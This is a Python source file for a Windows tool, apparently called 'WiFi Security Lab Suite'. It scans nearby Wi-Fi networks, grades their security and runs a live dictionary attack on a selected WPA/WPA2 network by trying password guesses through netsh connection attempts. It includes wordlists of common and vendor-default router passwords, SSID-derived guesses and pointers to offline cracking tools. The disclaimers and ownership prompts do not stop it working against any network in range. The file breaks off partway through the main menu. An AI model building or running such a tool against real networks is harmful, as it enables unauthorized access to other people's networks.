#!/usr/bin/env python3
"""
WiFi Security Lab Suite v3.0
Educational tool — authorized testing on networks you own ONLY.
Uses Windows netsh — no special hardware or driver required.
"""

import subprocess, re, time, sys, os, random, threading, msvcrt
import json, textwrap, xml.sax.saxutils as xesc
import tempfile, io
from datetime import datetime
from pathlib import Path

# Force UTF-8 on Windows so emoji/box-drawing chars work
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
    os.system("chcp 65001 >nul 2>&1")

# ── auto-install ──────────────────────────────────────────────────────────────
for _pkg in ("rich", "colorama"):
    try: __import__(_pkg)
    except ImportError:
        subprocess.run([sys.executable,"-m","pip","install",_pkg,"-q"],
                       capture_output=True)

from rich.console  import Console
from rich.table    import Table
from rich.panel    import Panel
from rich.text     import Text
from rich.live     import Live
from rich.align    import Align
from rich.rule     import Rule
from rich.padding  import Padding
from rich.prompt   import Prompt, Confirm
from rich          import box
import colorama; colorama.init()

console = Console(highlight=False)
W       = min(console.width or 110, 130)

# ═══════════════════════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════════════════════
BANNER = r"""
 ██╗    ██╗██╗███████╗██╗      ██╗      █████╗ ██████╗
 ██║    ██║██║██╔════╝██║      ██║     ██╔══██╗██╔══██╗
 ██║ █╗ ██║██║█████╗  ██║█████╗██║     ███████║██████╔╝
 ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██║██╔══██╗
 ╚███╔███╔╝██║██║     ██║      ███████╗██║  ██║██████╔╝
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚══════╝╚═╝  ╚═╝╚═════╝"""

SUBTITLE = "S E C U R I T Y   L A B   S U I T E   v 3 . 0"

# ═══════════════════════════════════════════════════════════════════════════════
# BUILT-IN WORDLIST  (most common WiFi passwords + router defaults)
# ═══════════════════════════════════════════════════════════════════════════════
COMMON_PASSWORDS = [
    # Top universal
    "password","password1","password123","12345678","123456789","1234567890",
    "00000000","11111111","22222222","33333333","44444444","55555555","66666666",
    "77777777","88888888","99999999","01234567","12345670","12341234","11223344",
    "qwerty123","qwerty","qwertyui","asdfghjk","zxcvbnm1","iloveyou","sunshine",
    "princess","letmein","monkey123","dragon123","master12","football","baseball",
    "superman","batman123","starwars","welcome1","hello123","abc12345","test1234",
    # Common phrases
    "myhomewifi","homenetwork","mynetwork","mywifi","internet","wireless","router",
    # Keyboard patterns
    "1q2w3e4r","1qaz2wsx","q1w2e3r4","zaq12wsx","qazwsxedc",
    # Date patterns
    "20202020","20212021","20222022","20232023","20242024","20252025",
    "01012000","01012001","19801234",
    # TP-Link defaults
    "1234567890","tplink","tp-link","tplink123","admin123","admin1234",
    # Netgear defaults
    "netgear","netgear1","password","1234567890",
    # ASUS defaults
    "admin","asus","asusrouter","admin1234",
    # D-Link defaults
    "dlink","d-link","admin1234","1234567890",
    # Linksys defaults
    "linksys","cisco123","admin","1234",
    # Huawei defaults
    "HuaweiHome","admin@huawei","12345678","Huawei12",
    # ZTE defaults
    "zte","zte1234","admin123",
    # Vodafone / ISP patterns
    "vodafone","vodafone1","spectrum","xfinity","attadmin","comcast","bt12345",
    # Pakistani ISP defaults (common in your region)
    "ptcl1234","ptclnet","nayatel1","stormfiber","jazz1234","telenor1",
    "cybernet","brain1234","linkdotnet","wateen123",
    # Alphanumeric patterns
    "abc123456","abcd1234","pass1234","pass12345","mypass123",
    # Short common
    "12345","123456","1234","admin","root","test","guest","home",
]

# Manufacturer → likely default passwords (OUI-based lookup)
MANUFACTURER_DEFAULTS = {
    "TP-Link" : ["1234567890","admin123","tplink","tplinkwifi","admin","12345678"],
    "Netgear" : ["password","1234567890","netgear","admin","12345678"],
    "ASUS"    : ["admin","admin1234","asus","asusrouter"],
    "D-Link"  : ["admin","d-link","dlink","1234","admin1234"],
    "Linksys" : ["admin","linksys","cisco","1234","password"],
    "Huawei"  : ["HuaweiHome","12345678","admin@huawei","Huawei12"],
    "ZTE"     : ["zte","admin","1234","zxdsl","12345678"],
    "Xiaomi"  : ["admin","xiaomi","mijia123","1234567890"],
    "Ubiquiti": ["ubnt","admin","ubiquiti"],
    "Netgear" : ["password","1234567890"],
    "Unknown" : [],
}

# ═══════════════════════════════════════════════════════════════════════════════
# VENDOR OUI
# ═══════════════════════════════════════════════════════════════════════════════
OUI = {
    # TP-Link
    "e8:fc:af":"TP-Link","98:da:c4":"TP-Link","f4:f2:6d":"TP-Link","c4:e9:84":"TP-Link",
    "50:c7:bf":"TP-Link","54:af:97":"TP-Link","b0:be:76":"TP-Link","14:cc:20":"TP-Link",
    "b4:b0:24":"TP-Link","a0:f3:c1":"TP-Link","d8:0d:17":"TP-Link","ec:08:6b":"TP-Link",
    # Netgear
    "74:d0:2b":"Netgear","a0:21:b7":"Netgear","28:c6:8e":"Netgear","9c:d3:6d":"Netgear",
    "20:e5:2a":"Netgear","c0:ff:d4":"Netgear","00:26:f2":"Netgear","84:1b:5e":"Netgear",
    # Linksys / Cisco
    "b8:a3:86":"Linksys","00:14:bf":"Linksys","c8:d7:19":"Linksys",
    "00:1c:10":"Cisco","00:1b:d4":"Cisco","d8:67:d9":"Cisco",
    # D-Link
    "10:62:eb":"D-Link","00:1c:f0":"D-Link","14:d6:4d":"D-Link","1c:7e:e5":"D-Link",
    "b0:c5:54":"D-Link","34:08:04":"D-Link","c8:be:19":"D-Link","00:26:5a":"D-Link",
    # ASUS
    "00:1b:2f":"ASUS","50:46:5d":"ASUS","00:0c:e7":"ASUS","30:5a:3a":"ASUS",
    "04:d4:c4":"ASUS","ac:9e:17":"ASUS","74:d0:2b":"ASUS","f8:32:e4":"ASUS",
    # Huawei
    "c4:04:15":"Huawei","00:e0:fc":"Huawei","28:31:52":"Huawei","f8:01:13":"Huawei",
    "50:ec:50":"Huawei","10:1b:54":"Huawei","48:00:31":"Huawei","a4:c6:4f":"Huawei",
    "18:02:2d":"Huawei","80:fb:06":"Huawei","00:18:82":"Huawei","04:bd:88":"Huawei",
    # Xiaomi
    "28:6c:07":"Xiaomi","64:09:80":"Xiaomi","50:8f:4c":"Xiaomi","a8:57:4e":"Xiaomi",
    "f4:8b:32":"Xiaomi","34:ce:00":"Xiaomi","78:11:dc":"Xiaomi","68:df:dd":"Xiaomi",
    # Tenda
    "c8:3a:35":"Tenda","14:75:90":"Tenda","00:b0:0c":"Tenda","e8:65:d4":"Tenda",
    "18:a6:f7":"Tenda","c8:9f:1a":"Tenda","4c:11:bf":"Tenda","cc:79:cf":"Tenda",
    "48:ee:0c":"Tenda","d4:76:ea":"Tenda","f4:6d:04":"Tenda",
    # Ubiquiti
    "18:31:bf":"Ubiquiti","24:a4:3c":"Ubiquiti","00:27:22":"Ubiquiti",
    "78:8a:20":"Ubiquiti","dc:9f:db":"Ubiquiti","44:d9:e7":"Ubiquiti",
    # ZTE
    "4c:ed:fb":"ZTE","64:13:6c":"ZTE","00:19:15":"ZTE","5c:a4:8a":"ZTE",
    "00:e0:4c":"ZTE","bc:76:70":"ZTE",
    # MikroTik
    "4c:5e:0c":"MikroTik","cc:2d:e0":"MikroTik","6c:3b:6b":"MikroTik",
    "b8:69:f4":"MikroTik","48:8f:5a":"MikroTik",
    # Realtek / generic
    "00:e0:4c":"Realtek",
}

def vendor_of(bssid: str) -> str:
    return OUI.get(bssid[:8].lower(), "Unknown")

# ═══════════════════════════════════════════════════════════════════════════════
# NETSH HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def netsh(*args, timeout=8) -> str:
    try:
        r = subprocess.run(["netsh"]+list(args),
                           capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           timeout=timeout)
        return r.stdout
    except Exception:
        return ""

def scan_networks() -> list[dict]:
    raw = netsh("wlan","show","networks","mode=bssid", timeout=12)
    return _parse_netsh(raw)

def _parse_netsh(raw: str) -> list[dict]:
    nets, cur = [], {}
    for line in raw.splitlines():
        line = line.strip()
        if not line: continue
        k, _, v = line.partition(":")
        k, v = k.strip(), v.strip()
        if re.match(r"^SSID\s*\d*$", k):
            if cur.get("ssid") is not None: nets.append(cur); cur={}
            cur["ssid"] = v or "<Hidden>"
        elif "BSSID" in k:
            m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", v)
            if m: cur["bssid"] = m.group(1).upper()
        elif "Authentication" in k:  cur["auth"]   = v
        elif "Encryption"     in k:  cur["enc"]    = v
        elif "Signal"         in k:
            try: cur["signal"] = int(v.replace("%",""))
            except: cur["signal"] = 0
        elif "Radio type"     in k:  cur["radio"]  = v
        elif "Channel"        in k:
            try: cur["ch"] = int(v)
            except: cur["ch"] = 0
        elif "Network type"   in k:  cur["type"]   = v
    if cur.get("ssid") is not None: nets.append(cur)
    return nets

def current_interface() -> dict:
    raw = netsh("wlan","show","interfaces")
    info = {}
    for line in raw.splitlines():
        k,_,v = line.partition(":")
        k,v = k.strip(),v.strip()
        if "Name"  in k and "Interface" not in k: info["iface"] = v
        if "State" in k:  info["state"] = v
        if "SSID"  in k and "BSSID" not in k: info["ssid"] = v
    return info

# ═══════════════════════════════════════════════════════════════════════════════
# WPA2 PROFILE + CONNECTION ATTEMPT
# ═══════════════════════════════════════════════════════════════════════════════
_WPA2_XML = """\
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
 <name>{name}</name>
 <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
 <connectionType>ESS</connectionType>
 <connectionMode>manual</connectionMode>
 <MSM><security>
  <authEncryption>
   <authentication>{auth}</authentication>
   <encryption>{enc}</encryption>
   <useOneX>false</useOneX>
  </authEncryption>
  <sharedKey>
   <keyType>passPhrase</keyType>
   <protected>false</protected>
   <keyMaterial>{pw}</keyMaterial>
  </sharedKey>
 </security></MSM>
</WLANProfile>"""

def _auth_enc_tags(net: dict):
    auth = net.get("auth","").upper()
    enc  = net.get("enc","").upper()
    if   "WPA3" in auth: return "WPA3SAE",  "AES"
    elif "WPA2" in auth: return "WPA2PSK",  "AES" if "CCMP" in enc else "TKIP"
    elif "WPA"  in auth: return "WPAPSK",   "AES"
    return "WPA2PSK", "AES"

def try_password(net: dict, password: str) -> bool:
    """Attempt WPA2 connection. Returns True if connected."""
    ssid = net.get("ssid","test")
    auth_tag, enc_tag = _auth_enc_tags(net)
    xml = _WPA2_XML.format(
        name = xesc.escape(ssid),
        ssid = xesc.escape(ssid),
        auth = auth_tag,
        enc  = enc_tag,
        pw   = xesc.escape(password),
    )
    profile_name = f"__wifilab_{ssid}__"
    # write temp profile
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".xml",
                                     delete=False, encoding="utf-8")
    try:
        tmp.write(xml); tmp.flush(); tmp.close()
        # add profile silently
        subprocess.run(["netsh","wlan","add","profile",f"filename={tmp.name}"],
                       capture_output=True, timeout=5)
        # attempt connection
        subprocess.run(["netsh","wlan","connect",f"name={ssid}"],
                       capture_output=True, timeout=5)
        # wait for auth result
        time.sleep(4.5)
        # check state
        iface = current_interface()
        connected = (iface.get("state","").lower() == "connected" and
                     iface.get("ssid","") == ssid)
        return connected
    except Exception:
        return False
    finally:
        try: os.unlink(tmp.name)
        except: pass
        subprocess.run(["netsh","wlan","disconnect"],        capture_output=True)
        subprocess.run(["netsh","wlan","delete","profile",f"name={ssid}"],
                       capture_output=True)

# ═══════════════════════════════════════════════════════════════════════════════
# SMART WORDLIST BUILDER
# ═══════════════════════════════════════════════════════════════════════════════
def smart_wordlist(net: dict) -> list[str]:
    vendor  = vendor_of(net.get("bssid",""))
    ssid    = net.get("ssid","").strip()
    wl = []

    # 1 — manufacturer defaults first
    wl += MANUFACTURER_DEFAULTS.get(vendor, [])

    # 2 — SSID-derived guesses
    base = re.sub(r"[^a-zA-Z0-9]","", ssid).lower()
    if base:
        wl += [base, base+"1", base+"123", base+"1234",
               base+"12345", base+"@123", base.capitalize(),
               base.capitalize()+"1", base.capitalize()+"123",
               ssid.replace(" ",""), ssid.replace("-",""),
               ssid.replace("_","")]

    # 3 — numeric suffixes of BSSID last octet (common trick)
    bssid = net.get("bssid","")
    if bssid:
        last = bssid[-5:].replace(":","")
        wl += [last, last+"1234", "12345678"+last]

    # 4 — common universal passwords
    wl += COMMON_PASSWORDS

    # deduplicate preserving order
    seen, out = set(), []
    for p in wl:
        if p not in seen and len(p) >= 8:  # WPA2 minimum is 8 chars
            seen.add(p); out.append(p)
    return out

# ═══════════════════════════════════════════════════════════════════════════════
# SECURITY ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════
def analyse(net: dict) -> dict:
    auth = net.get("auth","").upper()
    enc  = net.get("enc","").upper()
    if   "WPA3" in auth: grade,col,lbl = "A+","bold green","WPA3-SAE"
    elif "WPA2" in auth and "CCMP" in enc: grade,col,lbl = "A","green","WPA2-CCMP"
    elif "WPA2" in auth and "TKIP" in enc: grade,col,lbl = "B","yellow","WPA2-TKIP [!]"
    elif "WPA2" in auth: grade,col,lbl = "A","green","WPA2"
    elif "WPA"  in auth: grade,col,lbl = "C","bold yellow","WPA (legacy)"
    elif "OPEN" in auth or enc in ("NONE",""): grade,col,lbl = "F","bold red","OPEN [NO ENC]"
    else: grade,col,lbl = "?","dim",auth or "Unknown"
    return dict(grade=grade, color=col, label=lbl)

def sig_bar(pct: int) -> Text:
    b = int(pct/20); col="bright_green" if pct>=65 else("yellow" if pct>=35 else "red")
    t=Text(); t.append("▮"*b,style=col); t.append("▯"*(5-b),style="dim")
    t.append(f" {pct:>3}%",style=col); return t

def freq_tag(ch: int) -> str:
    if   1<=ch<=14:  return "[cyan]2.4 GHz[/cyan]"
    elif 36<=ch<=177:return "[magenta]5 GHz[/magenta]"
    return "[dim]?[/dim]"

# ═══════════════════════════════════════════════════════════════════════════════
# UI COMPONENTS
# ═══════════════════════════════════════════════════════════════════════════════
def _banner():
    os.system("cls")
    for l in BANNER.strip("\n").splitlines():
        console.print(Align.center(l), style="bold bright_green")
    console.print(Align.center(SUBTITLE), style="bold cyan")
    console.print(Align.center(
        "[ FOR AUTHORIZED PENETRATION TESTING ON NETWORKS YOU OWN ]"
    ), style="bold red")
    console.print()

def _rule(title=""):
    console.print(Rule(title, style="dim green", align="center"))

def _spinner_scan() -> list[dict]:
    results=[None]
    def worker(): results[0]=scan_networks()
    t=threading.Thread(target=worker,daemon=True); t.start()
    frames="◐◓◑◒"; msgs=[
        "Querying RF spectrum...","Parsing beacon frames...",
        "Identifying SSIDs...","Analysing cipher suites...",
        "Mapping topology...","Building report...",
    ]
    i=0
    with Live(console=console, refresh_per_second=10) as live:
        while t.is_alive() or i<4:
            sp=frames[i%4]; msg=msgs[min(i//5,len(msgs)-1)]
            bar_w=38; fill=min(i,bar_w)
            content=Text()
            content.append(f"\n  {sp} ","bold bright_green")
            content.append(msg+"\n\n","bright_green")
            content.append(f"  [{'█'*fill}{'░'*(bar_w-fill)}]\n\n","dim green")
            live.update(Panel(content,
                title="[bold bright_green]  SCANNING  [/bold bright_green]",
                border_style="bright_green", width=min(W,70)))
            i+=1; time.sleep(0.10)
            if not t.is_alive(): time.sleep(0.2); break
    t.join(); return results[0] or []

def build_scan_table(nets: list[dict]) -> Table:
    tbl=Table(box=box.SIMPLE_HEAVY, border_style="bright_green",
              header_style="bold bright_green", show_lines=True, padding=(0,1),
              title="[bold bright_green]  DETECTED NETWORKS  [/]",
              caption=f"[dim green]{datetime.now():%Y-%m-%d  %H:%M:%S}[/]")
    tbl.add_column("#",      style="dim",          width=3, justify="right")
    tbl.add_column("SSID",   style="bold cyan",    min_width=16, max_width=26)
    tbl.add_column("BSSID",  style="dim green",    width=19)
    tbl.add_column("VENDOR", style="dim cyan",     width=10)
    tbl.add_column("SIGNAL", width=14)
    tbl.add_column("FREQ",   width=9, justify="center")
    tbl.add_column("CH",     style="dim", width=4, justify="center")
    tbl.add_column("SECURITY", width=14, justify="center")
    tbl.add_column("GRADE",  width=5,  justify="center")

    gs={"A+":"bold green","A":"green","B":"yellow","C":"bold yellow",
        "F":"bold red","?":"dim"}
    for i,n in enumerate(nets,1):
        a=analyse(n)
        tbl.add_row(str(i), n.get("ssid","?"), n.get("bssid","?"),
                    vendor_of(n.get("bssid",""))[:10],
                    sig_bar(n.get("signal",0)),
                    freq_tag(n.get("ch",0)),
                    str(n.get("ch",0)) or "?",
                    Text(a["label"], style=a["color"]),
                    Text(f" {a['grade']} ", style=gs.get(a["grade"],"dim")))
    return tbl

# ═══════════════════════════════════════════════════════════════════════════════
# RECON MODULE
# ═══════════════════════════════════════════════════════════════════════════════
def show_recon(net: dict):
    _banner()
    a      = analyse(net)
    vendor = vendor_of(net.get("bssid",""))
    ssid   = net.get("ssid","?")
    bssid  = net.get("bssid","?")
    sig    = net.get("signal",0)
    ch     = net.get("ch",0)
    auth   = net.get("auth","?")
    enc    = net.get("enc","?")
    radio  = net.get("radio","?")

    sig_icons = "▮"*int(sig/20) + "▯"*(5-int(sig/20))
    freq_str  = "2.4 GHz" if 1<=ch<=14 else ("5 GHz" if 36<=ch<=177 else "?")
    freq_col  = "cyan" if freq_str=="2.4 GHz" else "magenta"
    grade_col = a["color"]

    # Attack surface — plain (sev, desc) strings, no embedded markup
    vulns = []
    if a["grade"] == "F":
        vulns.append(("CRITICAL","bold red","No encryption — all traffic visible in plaintext"))
    if "TKIP" in enc.upper():
        vulns.append(("HIGH","yellow","TKIP deprecated — vulnerable to MICHAEL attack"))
    if a["grade"] == "C":
        vulns.append(("MEDIUM","yellow","WPA v1 — legacy, upgrade to WPA2/3 recommended"))
    if a["grade"] in ("A","A+","B+","B"):
        vulns.append(("LOW","green","WPA2/3 — primary attack vector is weak password"))
    if ssid == "<Hidden>":
        vulns.append(("INFO","cyan","Hidden SSID — can be revealed by beacon monitoring"))
    if sig >= 85:
        vulns.append(("INFO","cyan",f"Very strong signal ({sig}%) — likely nearby device"))

    mfr_defaults = MANUFACTURER_DEFAULTS.get(vendor, [])

    # Build content as a markup string — rich WILL parse this correctly in Panel
    lines = [
        "",
        f"  [bold bright_green]TARGET SSID    [/]  [bold cyan]{ssid}[/]",
        f"  [bold bright_green]BSSID          [/]  [cyan]{bssid}[/]",
        f"  [bold bright_green]VENDOR         [/]  [cyan]{vendor}[/]",
        f"  [bold bright_green]SIGNAL         [/]  [cyan]{sig}%  {sig_icons}[/]",
        f"  [bold bright_green]CHANNEL        [/]  [cyan]{ch}[/]   [{freq_col}]{freq_str}[/{freq_col}]",
        f"  [bold bright_green]RADIO          [/]  [cyan]{radio}[/]",
        f"  [bold bright_green]AUTH           [/]  [{grade_col}]{auth}[/{grade_col}]",
        f"  [bold bright_green]ENCRYPTION     [/]  [{grade_col}]{enc}[/{grade_col}]",
        f"  [bold bright_green]SECURITY GRADE [/]  [{grade_col}]{a['grade']}  {a['label']}[/{grade_col}]",
        "",
        "  [bold red]ATTACK SURFACE[/bold red]",
    ]
    for sev, col, desc in vulns:
        lines.append(f"  [dim red]●[/]  [{col}]{sev}[/{col}]  [dim]{desc}[/dim]")

    if mfr_defaults:
        lines.append("")
        lines.append(f"  [bold yellow]MANUFACTURER DEFAULTS ({vendor})[/bold yellow]")
        for pw in mfr_defaults[:6]:
            lines.append(f"  [dim yellow]  →[/dim yellow]  [yellow]{pw}[/yellow]")
    lines.append("")

    console.print(Panel(
        "\n".join(lines),
        title=f"[bold red]  RECON :  {ssid}  [/bold red]",
        border_style="red", padding=(0,2)))
    console.print()

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK MODULE
# ═══════════════════════════════════════════════════════════════════════════════
class AttackState:
    def __init__(self):
        self.running   = False
        self.stop      = False
        self.found     = None
        self.tried     = 0
        self.total     = 0
        self.current   = ""
        self.log       = []   # (password, result)

state = AttackState()

def _attack_worker(net: dict, wordlist: list[str]):
    state.running = True
    state.total   = len(wordlist)
    for pw in wordlist:
        if state.stop:
            break
        state.current = pw
        result = try_password(net, pw)
        state.log.append((pw, result))
        state.tried += 1
        if result:
            state.found = pw
            break
    state.running = False

def run_dictionary_attack(net: dict, wordlist: list[str]):
    """Run attack with live dashboard."""
    state.__init__()
    state.total = len(wordlist)

    thread = threading.Thread(target=_attack_worker, args=(net, wordlist), daemon=True)
    thread.start()

    ssid  = net.get("ssid","?")
    start = time.time()

    with Live(console=console, refresh_per_second=4) as live:
        while state.running or not thread.is_alive() is False:
            elapsed  = time.time() - start
            tried    = state.tried
            total    = state.total
            current  = state.current
            pct      = (tried / max(total,1)) * 100
            bar_w    = 40
            bar_fill = int(pct/100*bar_w)
            eta_sec  = (elapsed/max(tried,1)) * (total-tried) if tried > 0 else 0
            rate     = tried / max(elapsed,1) * 3600  # per hour

            # build live panel
            t = Text()
            t.append(f"\n  TARGET       ", "bold bright_green")
            t.append(f"{ssid}\n", "bold cyan")
            t.append(f"  PROGRESS     ", "bold bright_green")
            t.append(f"{tried}/{total}  ({pct:5.1f}%)\n", "cyan")
            t.append(f"  [{'█'*bar_fill}{'░'*(bar_w-bar_fill)}]\n\n", "dim green")
            t.append(f"  TESTING NOW  ", "bold bright_green")
            t.append(f"{current}\n", "yellow")
            t.append(f"  ELAPSED      ", "bold bright_green")
            t.append(f"{int(elapsed//60):02d}:{int(elapsed%60):02d}\n", "dim")
            t.append(f"  ETA          ", "bold bright_green")
            t.append(f"{int(eta_sec//60):02d}:{int(eta_sec%60):02d}\n", "dim")
            t.append(f"  RATE         ", "bold bright_green")
            t.append(f"~{int(rate)} attempts/hr\n\n", "dim")
            t.append(f"  LAST TRIED   ", "bold bright_green")
            # show last 5 attempts
            recent = state.log[-5:] if state.log else []
            if recent:
                for pw, res in reversed(recent):
                    icon = "[bold green]✓ HIT [/]" if res else "[dim]✗ miss[/]"
                    t.append("  "); t.append_text(Text.from_markup(f"  {icon} {pw}\n"))

            t.append("\n  [dim]Press Q to stop attack[/dim]\n")

            if state.found:
                t.append(f"\n  ╔══ PASSWORD FOUND ══╗\n", "bold green blink")
                t.append(f"  ║  {state.found}  ║\n", "bold bright_green")
                t.append(f"  ╚═══════════════════╝\n", "bold green")

            live.update(Panel(t,
                title="[bold red]  ☣  DICTIONARY ATTACK  ☣  [/bold red]",
                border_style="red" if not state.found else "bright_green",
                width=min(W,72)))

            # check keyboard
            if msvcrt.kbhit():
                k = msvcrt.getch().decode(errors="ignore").lower()
                if k == "q":
                    state.stop = True
                    break

            if not state.running:
                time.sleep(0.5); break

            time.sleep(0.25)

    thread.join(timeout=2)
    return state.found

# ═══════════════════════════════════════════════════════════════════════════════
# REPORT
# ═══════════════════════════════════════════════════════════════════════════════
def save_report(net: dict, found_pw: str | None, tried: int, duration: float):
    report = {
        "timestamp"   : datetime.now().isoformat(),
        "target_ssid" : net.get("ssid"),
        "target_bssid": net.get("bssid"),
        "auth"        : net.get("auth"),
        "enc"         : net.get("enc"),
        "result"      : "CRACKED" if found_pw else "NOT FOUND",
        "password"    : found_pw,
        "attempts"    : tried,
        "duration_sec": round(duration, 1),
    }
    path = Path("wifi_lab_report.json")
    existing = []
    if path.exists():
        try: existing = json.loads(path.read_text())
        except: existing = []
    existing.append(report)
    path.write_text(json.dumps(existing, indent=2))
    return path

def show_result(net: dict, found: str | None, tried: int, elapsed: float):
    _banner()
    a    = analyse(net)
    ssid = net.get("ssid","?")

    content = Text()
    content.append(f"\n  TARGET SSID   {ssid}\n",     "bold cyan")
    content.append(f"  BSSID         {net.get('bssid','?')}\n", "dim cyan")
    content.append(f"  SECURITY      {a['label']}\n\n", a["color"])
    content.append(f"  ATTEMPTS      {tried}\n",       "dim")
    content.append(f"  DURATION      {int(elapsed//60):02d}:{int(elapsed%60):02d}\n\n", "dim")

    if found:
        content.append("  ╔══════════════════════════════╗\n", "bold green")
        content.append("  ║   ✓  PASSWORD CRACKED         ║\n", "bold bright_green")
        content.append(f"  ║   PASSWORD: {found:<17} ║\n", "bold bright_green")
        content.append("  ╚══════════════════════════════╝\n\n", "bold green")
        border = "bright_green"
        title  = "[bold bright_green]  ✓  SUCCESS  [/bold bright_green]"
    else:
        content.append("  ✗  Password not found in wordlist\n\n", "bold red")
        content.append("  TIP: Try a larger wordlist (rockyou.txt)\n", "yellow")
        content.append("  TIP: On Kali Linux, use aircrack-ng + hashcat\n", "yellow")
        content.append("  TIP: Capture handshake → offline crack = millions/sec\n", "dim")
        border = "red"
        title  = "[bold red]  ✗  NOT FOUND  [/bold red]"

    rpt = save_report(net, found, tried, elapsed)
    content.append(f"\n  Report saved → {rpt}\n", "dim green")

    console.print(Panel(content, title=title, border_style=border, padding=(0,2)))
    console.print()
    console.print("[dim]Press any key to return to menu...[/dim]")
    msvcrt.getch()

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK MENU
# ═══════════════════════════════════════════════════════════════════════════════
def attack_menu(net: dict):
    while True:
        _banner()
        show_recon(net)
        a    = analyse(net)
        ssid = net.get("ssid","?")

        if a["grade"] == "F":
            console.print(Panel(
                Text.from_markup(
                    "\n  [bold red]☠  OPEN NETWORK[/bold red]\n\n"
                    "  No encryption — no password to crack.\n"
                    "  Any device can connect freely.\n"
                    "  Traffic is plaintext — interceptable with Wireshark.\n"
                ),
                border_style="red", padding=(0,2)))
            console.print("[dim]Press any key...[/dim]"); msvcrt.getch(); return

        wl_smart   = smart_wordlist(net)
        wl_full    = list(dict.fromkeys(wl_smart + COMMON_PASSWORDS))

        console.print(Panel(
            Text.from_markup(
                f"\n  [bold bright_green]TARGET[/]  [cyan]{ssid}[/]\n\n"
                f"  [bold bright_green]A)[/] Smart Attack   [dim]~{len(wl_smart)} passwords (SSID-derived + vendor defaults first)[/]\n"
                f"  [bold bright_green]B)[/] Full Wordlist  [dim]~{len(wl_full)} passwords (all common + SSID + vendor)[/]\n"
                f"  [bold bright_green]C)[/] Custom File    [dim]Load your own wordlist .txt (rockyou.txt etc.)[/]\n"
                f"  [bold bright_green]D)[/] Single Test    [dim]Test one specific password manually[/]\n"
                f"  [bold bright_green]Q)[/] Back\n\n"
                "  [dim]⚡ Speed: ~720 attempts/hr on Windows netsh[/dim]\n"
                "  [dim]   For faster offline cracking: use Kali + aircrack-ng + hashcat[/dim]\n"
            ),
            title="[bold red]  ATTACK MODULE  [/bold red]",
            border_style="red", padding=(0,2)
        ))

        key = Prompt.ask("[bold green]SELECT[/bold green]",
                         choices=["a","b","c","d","q"], default="a")

        if key == "q": return

        wordlist = None
        if   key == "a": wordlist = wl_smart
        elif key == "b": wordlist = wl_full
        elif key == "c":
            path = Prompt.ask("[cyan]Wordlist file path[/cyan]")
            try:
                with open(path,"r",encoding="utf-8",errors="ignore") as f:
                    wordlist = [l.strip() for l in f if 8<=len(l.strip())<=63]
                console.print(f"[green]Loaded {len(wordlist)} passwords[/green]")
                time.sleep(1)
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]"); time.sleep(2); continue
        elif key == "d":
            pw = Prompt.ask("[cyan]Password to test[/cyan]")
            wordlist = [pw]

        if not wordlist:
            console.print("[red]Empty wordlist.[/red]"); time.sleep(1); continue

        # Final confirmation
        console.print()
        console.print(Panel(
            Text.from_markup(
                "\n  [bold red]⚠  AUTHORIZATION REQUIRED[/bold red]\n\n"
                f"  You are about to attack: [cyan]{ssid}[/cyan]\n\n"
                "  Confirm you are the owner of this network\n"
                "  and have explicit authorization to test it.\n"
                "  Unauthorized access is illegal worldwide.\n"
            ),
            border_style="red", padding=(0,2)))

        if not Confirm.ask("[bold red]I own this network and authorize this test[/bold red]",
                           default=False):
            console.print("[dim]Cancelled.[/dim]"); time.sleep(1); continue

        start = time.time()
        found = run_dictionary_attack(net, wordlist)
        elapsed = time.time() - start
        show_result(net, found, state.tried, elapsed)

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════════════════════
def disclaimer():
    _banner()
    console.print(Panel(
        Text.from_markup(
            "\n  [bold red]LEGAL DISCLAIMER[/bold red]\n\n"
            "  This tool is for [bold]educational use only[/bold] in authorized lab environments.\n\n"
            "  ● Only test networks you OWN or have explicit written permission to test.\n"
            "  ● Unauthorized WiFi access is a criminal offense in most countries.\n"
            "  ● The author is not responsible for misuse.\n\n"
            "  [dim]By continuing you confirm all testing is authorized.[/dim]\n"
        ),
        border_style="red", padding=(0,2)
    ))
    if not Confirm.ask("[bold red]I understand and accept[/bold red]", default=False):
        console.print("[dim]Exiting.[/dim]"); sys.exit(0)

def main():
    disclaimer()
    nets: list[dict] = []
    target: dict     = {}

    while True:
        _banner()
        sel_info = f"[cyan]{target.get('ssid','none')}[/cyan]" if target else "[dim]none[/dim]"
        net_info = f"[cyan]{len(nets)} found[/cyan]"           if nets     else "[dim]not scanned[/dim]"

        console.print(Panel(
            Text.from_markup(
                f"\n  [bold bright_green]1)[/]  Scan Nearby Networks    {net_info}\n"
                f"  [bold bright_green]2)[/]  Select Target           {sel_info}\n"
                f"  [bold bright_green]3)[/]  Recon / Intel\n"
                f"  [bold bright_green]4)[/]  Launch Attack\n"
                f"  [bold bright_green]5)[/]  View Saved Reports\n"
                f"  [bold bright_green]Q)[/]  Quit\n"
            ),
            title="[bold bright_green]  MAIN MENU  [/bold bright_green]",
            border_style="bright_green", padding=(0,2), width=min(W,60)
        ))

        key = Prompt.ask("[bold green]>[/bold green]",
                         choices=["1","2","3","4","5","q"], default="1")

        if key == "q":
            os.system("cls")
            console.print(Align.center("\n[bold bright_green]SESSION TERMINATED[/bold bright_green]\n"))
            break

        elif key == "1":
            console.print()
            nets = _spinner_scan()
            _banner()
            if nets:
                console.print(Padding(build_scan_table(nets),(0,2)))
            else:
                console.print(Panel("[bold red]No networks found.[/bold red]\n"
                    "[dim]Enable WiFi adapter and retry.[/dim]",
